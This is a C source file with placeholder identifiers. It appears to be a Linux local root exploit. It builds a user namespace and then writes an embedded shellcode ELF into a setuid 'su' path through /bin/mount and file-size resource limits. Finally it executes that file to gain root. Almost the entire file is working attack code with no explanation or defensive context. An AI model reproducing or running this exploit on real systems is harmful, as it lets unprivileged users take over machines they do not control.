
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int suidExecMinimalElf ;
struct stat {int dummy; } ;
struct rlimit {int rlim_cur; int rlim_max; } ;
typedef int pid_t ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 scalar_t__ VAR_10 ;
 int VAR_11 ;
 scalar_t__ VAR_12 ;
 int FUNC_0 (int ,scalar_t__,int,char**) ;
 int FUNC_1 (int) ;
 int FUNC_2 (int,int) ;
 int VAR_13 ;
 int FUNC_3 (char*,char**,int *) ;
 int FUNC_4 (int) ;
 int FUNC_5 () ;
 int FUNC_6 (int ,char*,...) ;
 int FUNC_7 () ;
 int FUNC_8 () ;
 int FUNC_9 (int,int,int ) ;
 int FUNC_10 (char*,int) ;
 int FUNC_11 (char*,int,...) ;
 int FUNC_12 (int ,struct rlimit*) ;
 int FUNC_13 (char*,char*,int) ;
 int FUNC_14 (char*,struct stat*) ;
 int VAR_14 ;
 int FUNC_15 (char*,char*) ;
 char* FUNC_16 (int) ;
 int FUNC_17 (char*) ;
 scalar_t__ FUNC_18 (char*,char*,int) ;
 int FUNC_19 (int) ;
 int FUNC_20 (int,int *,int ) ;
 int FUNC_21 (int,char*,int) ;

int FUNC_22(int VAR_15, char *VAR_16[]) {
  int VAR_17;
  int VAR_18;
  char *VAR_19="/bin/su";
  char *VAR_20="/bin/mount";

  for(VAR_17=1; VAR_17<VAR_15; VAR_17++) {
    char *VAR_21=VAR_16[VAR_17];
    if(!FUNC_15(VAR_21, "--")) {
      VAR_17++;
      break;
    }
    if(FUNC_18(VAR_21, "--", 2)) {
      break;
    }

    FUNC_6(VAR_14, "%s: unknown argument %s\n", VAR_16[0], VAR_21);
    FUNC_4(1);
  }

  FUNC_10("/tmp/x", 0700);
  FUNC_10("/tmp/x/bin", 0700);
  FUNC_10("/tmp/x/over", 0700);





  pid_t VAR_22=FUNC_0(VAR_11, VAR_12+VAR_10,
      VAR_1|VAR_0|VAR_9, VAR_16+VAR_17);
  if(VAR_22==-1) {
    FUNC_6(VAR_14, "Clone failed: %d (%s)\n", VAR_13, FUNC_16(VAR_13));
    return(1);
  }

  char VAR_23[128];
  char VAR_24[128];

  FUNC_13(VAR_23, "/proc/%d/setgroups", VAR_22);
  int VAR_25=FUNC_11(VAR_23, VAR_5);
  if(VAR_25<0) {
    FUNC_6(VAR_14, "Failed to open setgroups\n");
    return(1);
  }
  VAR_18=FUNC_21(VAR_25, "deny", 4);
  if(VAR_18<0) {
    FUNC_6(VAR_14, "Failed to disable setgroups\n");
    return(1);
  }
  FUNC_1(VAR_25);

  FUNC_13(VAR_23, "/proc/%d/uid_map", VAR_22);
  FUNC_6(VAR_14, "Setting uid map in %s\n", VAR_23);
  int VAR_26=FUNC_11(VAR_23, VAR_5);
  if(VAR_26<0) {
    FUNC_6(VAR_14, "Failed to open uid map\n");
    return(1);
  }
  FUNC_13(VAR_24, "0 %d 1\n", FUNC_8());
  VAR_18=FUNC_21(VAR_26, VAR_24, FUNC_17(VAR_24));
  if(VAR_18<0) {
    FUNC_6(VAR_14, "UID map write failed: %d (%s)\n", VAR_13, FUNC_16(VAR_13));
    return(1);
  }
  FUNC_1(VAR_26);

  FUNC_13(VAR_23, "/proc/%d/gid_map", VAR_22);
  FUNC_6(VAR_14, "Setting gid map in %s\n", VAR_23);
  int VAR_27=FUNC_11(VAR_23, VAR_5);
  if(VAR_27<0) {
    FUNC_6(VAR_14, "Failed to open gid map\n");
    return(1);
  }
  FUNC_13(VAR_24, "0 %d 1\n", FUNC_7());
  VAR_18=FUNC_21(VAR_27, VAR_24, FUNC_17(VAR_24));
  if(VAR_18<0) {
    FUNC_6(VAR_14, "GID map write failed: %d (%s)\n", VAR_13, FUNC_16(VAR_13));
    return(1);
  }
  FUNC_1(VAR_27);


  struct stat VAR_28;
  while(1) {
    FUNC_19(100);
    VAR_18=FUNC_14("/tmp/x/over/su", &VAR_28);
    if(!VAR_18) break;
  }


  FUNC_13(VAR_23, "/proc/%d/cwd/su", VAR_22);


  char VAR_29[] = {
      0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
      0x80, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0xf8, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x02, 0x00, 0x28, 0x00,
      0x05, 0x00, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0xa2, 0x00, 0x00, 0x00,
      0xa2, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
      0x01, 0x00, 0x00, 0x00, 0xa4, 0x00, 0x00, 0x00, 0xa4, 0x90, 0x04, 0x08,
      0xa4, 0x90, 0x04, 0x08, 0x09, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
      0x06, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xc0, 0x89, 0xc8,
      0x89, 0xd0, 0x89, 0xd8, 0x04, 0xd2, 0xcd, 0x80,

      0x31, 0xc0, 0x04, 0xd0, 0xcd, 0x80,

      0x31, 0xc0, 0x89, 0xd0,
      0xb0, 0x0b, 0x89, 0xe1, 0x83, 0xc1, 0x08, 0x8b, 0x19, 0xcd, 0x80
  };
  char *VAR_30[]={"/bin/mount", ((void*)0)};

  int VAR_31=FUNC_11(VAR_23, VAR_3|VAR_2|VAR_4, 07777);
  if(VAR_31<0) {
    FUNC_6(VAR_14, "Failed to open %s, error %s\n", VAR_23, FUNC_16(VAR_13));
    return(1);
  }

  char *VAR_32=VAR_29;
  char *VAR_33=VAR_29+sizeof(VAR_29);
  while(VAR_32!=VAR_33) {
    char *VAR_34=VAR_32;
    while((!*VAR_34)&&(VAR_34!=VAR_33))
      VAR_34++;


    FUNC_9(VAR_31, VAR_34-VAR_29, VAR_8);
    VAR_32=VAR_34;
    while((*VAR_34)&&(VAR_34!=VAR_33))
      VAR_34++;

    pid_t VAR_35=FUNC_5();
    if(!VAR_35) {
      struct rlimit VAR_36;



      VAR_36.rlim_cur=VAR_34-VAR_29;
      VAR_36.rlim_max=VAR_36.rlim_cur;
      FUNC_12(VAR_7, &VAR_36);




      VAR_36.rlim_cur=1<<22;
      VAR_36.rlim_max=VAR_36.rlim_cur;
      VAR_18=FUNC_12(VAR_6, &VAR_36);

      FUNC_2(VAR_31, 1);
      FUNC_2(VAR_31, 2);
      VAR_30[0]=VAR_32;
      FUNC_3(VAR_20, VAR_30, ((void*)0));
      FUNC_6(VAR_14, "Exec failed\n");
      return(1);
    }
    FUNC_20(VAR_35, ((void*)0), 0);
    VAR_32=VAR_34;
  }
  FUNC_1(VAR_31);
  FUNC_3(VAR_23, VAR_16+VAR_17-1, ((void*)0));
  FUNC_6(VAR_14, "Failed to execute %s: %d (%s)\n", VAR_23,
      VAR_13, FUNC_16(VAR_13));
  return(1);
}
